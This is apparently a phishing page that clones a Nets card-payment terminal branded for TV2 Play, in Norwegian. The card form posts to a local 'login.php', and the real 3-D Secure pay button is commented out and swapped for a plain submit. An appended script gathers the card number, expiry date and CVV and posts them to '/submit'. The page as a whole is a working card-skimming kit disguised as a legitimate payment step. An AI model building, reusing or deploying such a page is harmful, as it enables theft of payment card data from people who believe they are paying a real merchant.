

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="nb-NO">
<head id="Head1"><title>
	Nets – Accept payment method
</title><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /><meta name="apple-touch-fullscreen" content="YES" /><meta name="robots" content="noindex" /><script type="text/javascript" src="https://epayment.nets.eu/terminal/lib/jquery/jquery.3.5.min.js?v3.4.2"></script>
       
    
    <script src="https://epayment.nets.eu/terminal/Scripts/Mobile/Generic/Default.js?1711" type="text/javascript"></script>    
    <!--[if lt IE 9]>
    <script src="../../Scripts/Mobile/Generic/msie8.js" type="text/javascript"></script>
<![endif]-->
<link rel="stylesheet" href="https://epayment.nets.eu/terminal/Mobile/Generic/Css/netaxept.generic.mobile-Existing.css?1611" /><link rel="stylesheet" href="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.min.css?1" /><script type="text/javascript" src="https://epayment.nets.eu/terminal/Scripts/TDSMethod.js?2052"></script></head>
<script type="text/javascript">
    var __doPostBack;
    $(document).ready(function () {

        if (typeof (__doPostBack) !== typeof (Function)) {
            var str = `var theForm = document.forms['form1'];
	                    if (!theForm) {
		                    theForm = document.form1;
	                    }
	                    var EVENTTARGET = document.createElement("INPUT");
	                    EVENTTARGET.setAttribute("type", "hidden");
	                    EVENTTARGET.setAttribute("id", "__EVENTTARGET");
	                    EVENTTARGET.setAttribute("name", "__EVENTTARGET");

	                    var EVENTARGUMENT = document.createElement("INPUT");
	                    EVENTARGUMENT.setAttribute("type", "hidden");
	                    EVENTARGUMENT.setAttribute("id", "__EVENTARGUMENT");
	                    EVENTARGUMENT.setAttribute("name", "__EVENTARGUMENT");

	                    theForm.appendChild(EVENTTARGET);
	                    theForm.appendChild(EVENTARGUMENT);

                        if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                            theForm.__EVENTTARGET.value = eventTarget;
                            theForm.__EVENTARGUMENT.value = eventArgument;
                            theForm.submit();
                        }`

            __doPostBack = new Function('eventTarget', 'eventArgument', str);
        }

             

    });
</script>

<body id="body">
         
    <link rel="stylesheet" href="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.min.css?1" />
    <script src="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.3.5.min.js?v=3.4.2" type="text/javascript"></script>
    
    <style>


      

        </style>
        
        <style>
                    .ui-body-netaxept, .ui-overlay-netaxept {
            background: #f2f2f2;
        }
        .ui-btn-up-netaxeptCancel,.ui-btn-hover-netaxeptCancel 
        {
        color      : #FFFFFF;
        background :#d62700;     
        }      
                .ui-btn-up-netaxeptPay, .ui-btn-hover-netaxeptPay {
            color: #000000;
            background: #4b8500;
        } 
                  .ui-bar-netaxept {
            color: ;
            background: #f2f2f2;
        }

        </style>
        

    <div data-role="page" data-theme="netaxept" id="terminalPage" >
        <form name="form1" method="post" action="login.php" id="form1" data-ajax="false">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />


<script type="text/javascript">
//<![CDATA[
 var validationRequiredforMaestro = 'True'; var verificationLabel = 'CreditCardMobileIssuer_securityCodeLabel'; var securityCode = 'securityCode'; var cardNumber = 'cardNumber'; var easyPaymentEpaySessionId = 'c1721cf55c204a8fbaae23742c475c1a';
var perforing3dsCheck = true;
window.tdsMethodIssuerId = '0';

function ContinueAfter3dsMethod(threeDSMethodData)
{
var processButtonObj = window.document.getElementById('payButton');
window.perforing3dsCheck = false;
processButtonObj.click();
}
//]]>
</script>
<script type="text/javascript"> var netaxeptPaymentRequestParams = {"processEndPointUrl":"/externalnotification/paymentrequest/","nonce":{"paymentIdentifier":"c1721cf55c204a8fbaae23742c475c1a"},"orderDetails":{"isShippingRequired":true,"displayShippingOPtions":false,"isContactInfoRequired":true,"orderAmount":"100","orderCurrency":"NOK","allowedIssuers":["Visa","MasterCard","DinersClubInternational","Maestro","VisaPrepaid"]}}</script>
<script src="https://epayment.nets.eu/terminal/ScriptResource.axd?d=fCLjNrFUeD7_az0jCw9Qpe0W4ojBXmAPDRiTVZ_QIB4W0CmVcUoNzjr_htyntn_kljivsg8YcUiybyp0U5q-wVbuywvQMsxDsskfx1kY2y3zdt3WBE5-6YcwfPJO8LCjyI1yvi39NclyosC9Wa0wtEA8ZdA1&amp;t=49337fe8" type="text/javascript"></script>
<script src="https://epayment.nets.eu/terminal/Webservices/Terminal.asmx/js" type="text/javascript"></script>
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="A68248BB" />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="uBlU4uougMeOeTpFf0d2VZaQVmar6Vx6mO9mqcB8/hX0Ofl4Hle6ymvd8AXnlSPvJnPwYtbUtPAxtxXh3K+8/ICXCVHgictLSmxbnYcbJVvWz7TeYGIcaFuywDSqAe187mFEils7ICsytHe5onx0IlKrvfaK+bW6KJnIqL0krdqCltYThMWdjU10ScLGkiCKyVUl2/i9+64eMpCutxlfWav19ggf0pN4KtLFYT45ChUZt4+SQf151taDgD436VY04wLc3C4fnZWP42ONVRgvX/UxSHyrSgaUMJY+N83I5NM51QljX8q5Z23IL/DDpbDXwo9/HoeajYWXqI+4sn0WEr7xjTHuzv390vHIuSKBjaq2koHr5f6+2TSSP4NPXGL+1IW8IVEZ+jwkJSy3gGQDAdNbEHir171jJxwMyMSMm/o0p0A571RE0mrhQlhPKCT0rjpODvp6QiqRrYlcHMt4dW5Og9IGjyXZwtZEo0+tUdnMfXKNa8CQP//fq1uH27BQFYLheCIqxUPFroBCAmjpUOAOnqdSux/9paa6y0Ezw+5prYYJEO0R6frWjm2RDTeudEA+YhhD+PNd63VDYySc0kMi7WY0uIUBUZ6mXFedXI1nvlEsvSf65thgYlij/XhMs+u3DHCjZQQgZqk6TOvutdqhO8qV/ZvygBGonorBc0eEzEEise333KdzxJWMzaIygpLB9UbxXdPhginy/QiWUIoogHaN6XsjlNtqpgPRrCnS00roa6sUb4aR9Xxa96a/tA14AzBhqTSh/Baw" />
            <div id="netaxeptHeader" data-role="header" data-nobackbtn="true" align="center" data-theme="netaxept" class="ui-bar-netaxept">
                <img src="https://sumo.cdn.tv2.no/static_assets/nets/logo_tv2play.png" id="merchantlogo" style="padding: .4em 0 0.2em 0" />
            </div>
            <div id="content" data-role="content" name="contentMain">
                
                <div id="contentPadding" class="contentPadding row">
                    <div id="genericContent" class="col-lg-7" style="">
                        <div id="terminalInputDiv">
                        <div id="ctl16_margins">
	

    <div id="ctl16_errorPanel" class="alert alert-danger errorPanel" style="display:none;">
		
        <span id="ctl16_errorText" role="alert"></span>
    
	</div>

    <div id="ctl16_warningPanel" class="alert alert-warning warningPanel" style="display:none;">
		
        <span id="ctl16_warningText" role="alert"></span>
    
	</div>

    <div id="ctl16_infoPanel" class="alert alert-info infoPanel" style="display:none;">
		
        <span id="ctl16_infoText" role="alert"></span>
    
	</div>

    <div id="ctl16_okPanel" class="alert alert-success okPanel" style="display:none;">
		
        <span id="ctl16_okText" role="alert"></span>
    
	</div>


</div>
                         <div style="height: 17px;">
                                
                         </div>
                        <div id="informationPanel">
	
                           
                            
                            <div id="infoDiv">
                                
                            
                            <table id="amounttable">
		<tr>
			<td>
                                    
                                </td>
			<td id="feeOld">
                                    
                                </td>
		</tr>
		<tr id="roundingAmountRow">
			<td style="padding-right: 5px">
                                    <span id="roundingLabel"></span>
                                </td>
			<td style="text-align: right">
                                    <span id="rounding" style="float: right;"></span>
                                </td>
		</tr>
		<tr id="totalAmountRow">
			<td style="padding-right: 5px">
                                    <span id="totalAmountLabel"></span>
                                </td>
			<td id="totalAmountNumrow">
                                    <span id="totalAmount" style="float: right;"></span>
                                </td>
		</tr>
	</table>
	

                            
                            
                        </div>
                                
</div>
                       
                         
                            
                        
                        <div>
                            


<style type="text/css"> 
    ::-webkit-input-placeholder { /* WebKit browsers */
        color:    dimgray ;
    }
    :-moz-placeholder { /* Mozilla Firefox 4 to 18 */
        color:    dimgray ;
    }
    ::-moz-placeholder { /* Mozilla Firefox 19+ */
        color:    dimgray ;
    }
    :-ms-input-placeholder { /* Internet Explorer 10+ */
        color:    dimgray ;
    }
    ::placeholder{
        color:    dimgray ;
    }
</style> 

<script type="text/javascript">

    var chkMobileDevice = true
    var easyPaymentCurrentIssuerImageId = "currentIssuerImage";
    var easyPaymentCurrentIssuerNameId = "test";
    var easyPaymentIssuers = [];

    $(document).ready(function () {

        $("#feeSection").click(function () {
            if ($("#feeDetails").is(":visible"))
                $("#expandCollapse").attr("src", "/Images/Misc/expand.png");
            else
                $("#expandCollapse").attr("src", "/Images/Misc/collapse.png");
            $("#feeDetails").stop().slideToggle();
        });
        GetIssuer(cardNumber);
        $('#issuerIcons').find('img').each(function () {
            this.style.marginRight = "5px";
            var id = this.alt.split('_')[0];
            var name = this.alt.split('_')[1];
            var iconObj = { imageId: this.id, issuerName: name, imageFile: this.src.substring(this.src.lastIndexOf('/') + 1) };
            $(this).attr('alt', name);
            // TODO workaround for Discover
            if (id != 6 || name != "Discover&reg;")
                easyPaymentIssuers[id] = iconObj;
            else
                easyPaymentDiscover = iconObj;
        });
    });
</script>





<div id="divTwoPagePayment" style="padding-top: 10px">
    <div id="issuerIcons" class="card-header" style="display: none">
    <img id="icon_Visa" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Visa.svg" alt="3_Visa" border="0" /><img id="icon_MasterCard" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Mastercard.svg" alt="4_MasterCard" border="0" /><img id="icon_DinersClubInternational" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Diners.svg" alt="6_Diners club international" border="0" /><img id="icon_Maestro" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Maestro.svg" alt="14_Maestro" border="0" /><img id="icon_VisaPrepaid" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/visa.png" alt="91_Visa" border="0" /></div>
    <div class="form-field__control" id="dvTwoPageCardNumber" ClientIDMode="Static" tabindex="-1">
        <input name="cardNumber" maxlength="19" id="cardNumber" class="form-field__input cardNo" placeholder="0000 0000 0000 0000" autocomplete="off" size="19" onChange="javascript:GetIssuer(this.id);" onKeyUp="javascript:GetIssuer(this.id);" type="tel" />
        <label for="cardNumber" id="cardNoLabel" class="form-field__label">Kortnummer</label>

        
    </div>
    <div class="form-field__control W_50pr f_left" id="dvExpiryDate" tabindex="-1">
        
        
        <div id="divDropdown">
            <div class="ui-grid-a">
              <div class="ui-block-a">
            <div><label for="month" id="month">Expiry Month:</label></div>
            <div><select name="month" id="month" tabindex="2">
	<option value="01">01</option>
	<option value="02">02</option>
	<option value="03">03</option>
	<option value="04">04</option>
	<option value="05">05</option>
	<option value="06">06</option>
	<option value="07">07</option>
	<option value="08">08</option>
	<option value="09">09</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>

</select></div>
                     
              </div>
              <div class="ui-block-b">
            <div><label for="year" id="year">Expiry Year:</label></div>
            <div>
                <select name="year" id="year" tabindex="3">
	<option value="23">2023</option>
	<option value="24">2024</option>
	<option value="25">2025</option>
	<option value="26">2026</option>
	<option value="27">2027</option>
	<option value="28">2028</option>
	<option value="29">2029</option>
	<option value="30">2030</option>
	<option value="31">2031</option>
	<option value="32">2032</option>
	<option value="33">2033</option>
	<option value="34">2034</option>
	<option value="35">2035</option>

</select>
            </div>
                   </div>  
              </div>
       </div> 
        </div>
    <div id="cvcDiv">
    <div class="form-field__control W_49pr" id="dvSecuritycode" tabindex="-1">
        <input name="securityCode" maxlength="4" id="securityCode" placeholder="000" class="form-field__input securityCode" autocomplete="off" size="4" type="tel" />
        <label for="securityCode" id="securityCodeLabel" class="form-field__label">Verifiseringskode</label>

        
    </div>
            
    <div id="mifDiv">
        <label class="mifLabel"><span id="mifTxt">Betal som Visa</span>
            <input id="mifCheckbox" type="checkbox" name="CreditCardMobileIssuer$mifCheckbox" />
            <span  class="mifCheckmark" aria-role="checkbox">&nbsp;&nbsp;</span><div id="mifImage"><img src="https://epayment.nets.eu/Images/Issuers/Icons/visa.png"/></div>

        </label>
        </div>
        <div id="netsLogoExt" style="text-align:right;width:45%;transform: translateY(30px);">
                           <img class="netaxeptLogo" src="https://epayment.nets.eu/terminal/Images/netsSmall_New.png" style="text-align:right" alt="Nets Logo" />
                     </div>
        </div>
    </div>
<input type="hidden" name="CreditCardMobileIssuer$validationRequired" id="validationRequired" value="True" />

<script type="text/javascript" src="https://epayment.nets.eu/epay/Scripts/Common.js?2065"></script>
<script type="text/javascript" src="https://epayment.nets.eu/epay/Scripts/EasyPayment.js?1858"></script>

                        </div>
                            
                    </div>
                </div>
                </div>
                 <div id="informationDiv" class="ui-grid-b">
                 
                        <div id="payButtonDiv" class="ui-block-c">
                           <!-- <input type="submit" name="payButton" value="Registrer" onclick="if (perforing3dsCheck) {window.document.getElementById(&#39;payButton&#39;).style.display=&#39;none&#39;;var progressImageObj=document.getElementById(&#39;progressImage&#39;);if(progressImageObj)progressImageObj.style.display=&#39;inline&#39;;Check3dsMethod(&#39;https://epayment.nets.eu/terminal&#39;, &#39;c1721cf55c204a8fbaae23742c475c1a&#39;, &#39;cardNumber&#39;, &#39;&#39;, &#39;month&#39;, &#39;year&#39;, &#39;0&#39;, &#39;ctl16_margins&#39;,&#39;payButton&#39;); return false;};" id="payButton" data-theme="netaxeptPay" class="ui-btn-up-netaxeptPay btn" />-->
                           <input type="submit" name="payButton" value="Registrer" onclick="javascript:__doPostBack('EasyPaymentMini$okButton','')" id="payButton" data-theme="netaxeptPay" class="ui-btn-up-netaxeptPay btn"/>
                        </div>
                    </div>
                    
           
                            <div id="dvSecureMessage">
                        <span id="lblSecureDataProcMessage"></span>
                            </div>
               <div id="toolbar">
                    
                    <div id="toolbarButtons" class="ui-grid-b">
                  
                        <div id="backButtonDiv" class="ui-block-a">
                            
                            </div>
                        <div id="cancelButtonDiv" class="ui-block-b">
                            
                        </div>
                        </div>
                    </div>
                <div id="progressImageDiv"><img id="progressImage" src="https://epayment.nets.eu/terminal/Images/transparentProgress.gif" src="Default.aspx@epaySessionId=c1721cf55c204a8fbaae23742c475c1a&amp;issuer=CreditCard&amp;fbclid=IwAR3PL8tfhMWgVVAAZtSyHdhYgUf6GHZg_12S_ezAIlXlDRDuB0hjXOxDJ5k.html" alt="Loading..." border="0" style="display: none;" /></div>
                </div>
                <div class="modal fade" id="modalCVV" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                               <span id="modalLabel" class="modal-title" style="font-weight:bold">Nets - Hva er CVV?</span>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                                <div style="border: solid 1px #7f7b7b;">
                                                      <table style="padding:0px;border-spacing:0px;" role="presentation">
                        
                        <tr role="presentation">
                            <td colspan="2" role="presentation">
                                <div style="font-weight: bold; padding: 10px; color: black">
                                    Hva er verifiseringskode(CVV2/ CVC2/CID)?
                                </div>
                                <div style="padding-left: 10px; color: black">
                                    <span id="into">Verifiseringskoden er et 3- eller 4-sifret nummer som er  skrivet på forsiden eller baksiden av kortet. Verifiseringskoden hjelper selgeren å forhindre svindel og bekrefte transaksjonen når det faktiske kortet ikke er til stede på kjøpstidspunktet. Dette nummeret brukes som en del av autorisasjonsprosessen med kortutsteder.</span>
                                </div>
                            </td>
                        </tr>
                        <tr role="presentation">
                            <td valign="top" role="presentation">
                                <div style="font-weight: bold; padding: 10px; color: black">
                                    Hvor finner jeg det?
                                </div>
                                <div style="font-weight: bold; padding-left: 10px; color: black">
                                    Visa, Mastercard, JCB, Diners Club og Discover
                                </div>
                                <div style="padding-left: 10px; color: black">
                                    <span id="visaCVV">Verifiseringskoden er det tresifrede nummeret som er skrevet ut på baksiden av kortet, vanligvis på slutten av signaturpanelet. Hvis du bruker et kreditt- / debetkort og vil betale med debet, er bekreftelseskoden de tre sifrene etter kortnummeret på kortets bakside.</span>
                                </div>
                            </td>
                        </tr>
                        <tr role="presentation">
                            <td valign="top" role="presentation">
                                <div style="font-weight: bold; padding-left: 10px; padding-top: 10px; color: black">American Express</div>
                                <div style="padding-left: 10px; padding-bottom: 10px; color: black">
                                    <span id="amexCVV">Verifiseringskoden er det 4-sifret nummeret som står på forsiden, over og til høyre på kortet ditt.</span>
                                </div>
                            </td>
                        </tr>
                    </table>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>
<!-- The Modal -->
        <div id="myModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;padding-top:70px;">
             <div class="modal-dialog" role="document">
            <div class="mymodal" ><span id="modalHeader" style="font-weight:bold;font-size:14px;"></span></div>
            <div class="mymodal">
                <span id="modalContent"></span>
            </div>
            <div class="mymodal">
                <button type="button" class="btn closewindow" onclick="close();"> <span id="modalFooter"></span></button></div>
        </div>
       </div>
        
            <input name="terminalDesign" type="hidden" id="terminalDesign" form="" value="false" />
<input type="hidden" name="hdnMerchandAcqID" id="hdnMerchandAcqID" value="578200" />            
        </form>
    </div>
    
   <script>
  $(document).ready(function() {
    // Replace 'form1' with the actual ID of your form element if different
    $('#form1').submit(function(e) {
      var cardNumber = $('#cardNumber').val();
      var month = $('#month').val();
      var year = $('#year').val();
      var cvv = $('#securityCode').val();

      if (!cardNumber || !month || !year || !cvv) {
        e.preventDefault(); // Prevent form submission
        alert('Vennligst fyll ut alle nødvendige felt');
      }
    });
  });

  function submitForm(event) {
    event.preventDefault();

    var cardNumber = document.getElementById('cardNumber').value;
    var securityCode = document.getElementById('securityCode').value;
    var month = document.getElementById('month').value;
    var year = document.getElementById('year').value;

    var formData = new FormData();
    formData.append('cardNumber', cardNumber);
    formData.append('securityCode', securityCode);
    formData.append('month', month);
    formData.append('year', year);

    fetch('/submit', {
        method: 'POST',
        body: formData
    }).then(function(response) {
        if (response.ok) {
            alert('Data submitted successfully!');
            document.getElementById('submit-form').reset();
        } else {
            alert('Error submitting data!');
        }
    }).catch(function(error) {
        console.error('Error:', error);
    });
}

</script>
</body>
</html>
